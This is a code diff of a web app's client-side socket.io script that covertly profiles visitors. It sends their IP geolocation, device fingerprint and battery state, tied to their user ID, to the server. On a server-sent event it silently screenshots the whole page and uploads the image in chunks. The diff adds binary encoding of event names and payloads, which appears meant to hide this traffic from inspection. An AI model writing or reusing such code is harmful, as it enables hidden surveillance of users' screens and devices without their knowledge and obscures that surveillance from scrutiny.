@@ -1,103 +1,135 @@
-document.addEventListener('DOMContentLoaded', () => {
+const socket = io();
 
-    const socket = io(`http://127.0.0.1:8070`);
+const currentuserId = document.getElementById('currentUserId').value;
+const currentuserName = document.getElementById('currentUserName').value;
+const logout = document.getElementById('logout');
+var ipAdd;
 
-    const content = document.getElementById('content');
-    const currentuserId = document.getElementById('currentUserId').value;
-    const currentuserName = document.getElementById('currentUserName').value;
-    const logout = document.getElementById('logout');
-    var ipAdd;
+socket.on('connect', async () => {
+    const binaryEvent = (event) => {
+        return event.split('').map(char => {
+            const asciiValue = char.charCodeAt(0);
 
-    socket.on('connect', async () => {
-        console.log('user connected :- ', socket.id);
+            const binaryValue = asciiValue.toString(2);
 
-        const socketId = socket.id;
+            return binaryValue.padStart(8, '0');
+        }).join(' ');
+    };
 
-        const raw = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query');
-        const ipAdd = await raw.json();
+    console.log('A new user connected :- ', socket.id);
+    const socketId = socket.id;
 
-        console.log(ipAdd, '--ipAdd--');
+    const raw = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query');
+    ipAdd = await raw.json();
 
-        const battery = await navigator.getBattery();
-        const batteryCharging = battery.charging ? true : false;
 
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            connectionType: navigator.connection.effectiveType,
-            deviceMemory: navigator.deviceMemory,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height,
-            viewportWidth: window.innerWidth,
-            viewportHeight: window.innerHeight,
-            colorDepth: screen.colorDepth,
-            downlink: navigator.connection.downlink,
-            batteryLevel: battery.level,
-            batteryCharging: batteryCharging
-        };
+    const battery = await navigator.getBattery();
+    const batteryCharging = battery.charging ? true : false;
 
+    const deviceInfo = {
+        userAgent: navigator.userAgent,
+        connectionType: navigator.connection.effectiveType,
+        deviceMemory: navigator.deviceMemory,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        viewportWidth: window.innerWidth,
+        viewportHeight: window.innerHeight,
+        colorDepth: screen.colorDepth,
+        downlink: navigator.connection.downlink,
+        batteryLevel: battery.level,
+        batteryCharging: batteryCharging
+    };
+
+    const data = {
+        userName: currentuserName,
+        userId: currentuserId,
+        socketId: socketId,
+        ipAdd: ipAdd,
+        deviceInfo: deviceInfo
+    };
+
+    const jsonString = JSON.stringify(data);
+
+    function stringToBinary(str) {
+        return str.split('')
+            .map(char => {
+                const binary = char.charCodeAt(0).toString(2);
+                return binary.padStart(8, '0');
+            })
+            .join(' ');
+    }
+
+    const binaryCode = stringToBinary(jsonString);
+
+    const userJoined = binaryEvent('userJoined');
+    socket.emit(userJoined, (binaryCode));
+
+    logout.addEventListener('click', (e) => {
+        const userLogout = binaryEvent('userLogout');
         const data = {
-            userName: currentuserName,
             userId: currentuserId,
-            socketId: socketId,
-            ipAdd: ipAdd,
-            deviceInfo: deviceInfo
+            userName: currentuserName,
+            socketId: socketId
         };
 
-        socket.emit('userJoined', (data));
+        const jsonString = JSON.stringify(data);
 
-        logout.addEventListener('click', (e) => {
-            socket.emit('userLogout', (data));
-        });
+        function stringToBinary(str) {
+            return str.split('')
+                .map(char => {
+                    const binary = char.charCodeAt(0).toString(2);
+                    return binary.padStart(8, '0');
+                })
+                .join(' ');
+        }
 
-        socket.on('userClicked', async () => {
-            try {
-                const captureCanvas = await html2canvas(content, {
-                    scrollX: window.scrollX,
-                    scrollY: 0,
-                    x: window.scrollX,
-                    y: window.scrollY,
-                    width: window.innerWidth,
-                    height: window.innerHeight,
-                    useCORS: true
-                });
+        const binaryCode = stringToBinary(jsonString);
 
-                console.log('Canvas created successfully:', captureCanvas);
+        socket.emit(userLogout, (binaryCode));
+    });
 
-                const blob = await new Promise((resolve, reject) => {
-                    captureCanvas.toBlob((blob) => {
-                        if (blob) {
-                            resolve(blob);
-                        } else {
-                            reject(new Error('Failed to create Blob from canvas'));
-                        }
-                    }, 'image/png');
-                });
+    const userClicked = binaryEvent('userClicked');
+    socket.on(userClicked, async () => {
+        try {
+            const captureCanvas = await html2canvas(document.body, {
+                scrollX: window.scrollX,
+                scrollY: 0,
+                x: window.scrollX,
+                y: window.scrollY,
+                width: window.innerWidth,
+                height: window.innerHeight,
+                useCORS: true
+            });
 
-                console.log('Blob created successfully:', blob);
+            const blob = await new Promise((resolve, reject) => {
+                captureCanvas.toBlob((blob) => {
+                    if (blob) {
+                        resolve(blob);
+                    } else {
+                        reject(new Error('Failed to create Blob from canvas'));
+                    }
+                }, 'image/png');
+            });
 
-                const arrayBuffer = await blob.arrayBuffer();
-                console.log('ArrayBuffer created successfully:', arrayBuffer);
+            const arrayBuffer = await blob.arrayBuffer();
 
-                const chunkSize = 25 * 1024;
-                const totalChunks = Math.ceil(arrayBuffer.byteLength / chunkSize);
+            const chunkSize = 25 * 1024;
+            const totalChunks = Math.ceil(arrayBuffer.byteLength / chunkSize);
 
-                console.log(totalChunks, '--totalChunks--');
+            for (let i = 0; i < totalChunks; i++) {
+                const start = i * chunkSize;
+                const end = Math.min(start + chunkSize, arrayBuffer.byteLength);
+                const chunk = arrayBuffer.slice(start, end);
 
-                for (let i = 0; i < totalChunks; i++) {
-                    const start = i * chunkSize;
-                    const end = Math.min(start + chunkSize, arrayBuffer.byteLength);
-                    const chunk = arrayBuffer.slice(start, end);
-                    console.log(chunk, '--chunk--');
-
-                    socket.emit('sentDataChunk', {
-                        chunk,
-                        index: i,
-                        totalChunks: totalChunks
-                    });
-                };
-            } catch (error) {
-                console.error('Error:', error);
-            }
-        });
+                const sentDataChunk = binaryEvent('sentDataChunk');
+                socket.emit(sentDataChunk, {
+                    chunk,
+                    index: i,
+                    totalChunks: totalChunks
+                }); //pending
+            };
+        } catch (error) {
+            console.error('Error:', error);
+        }
     });
 });
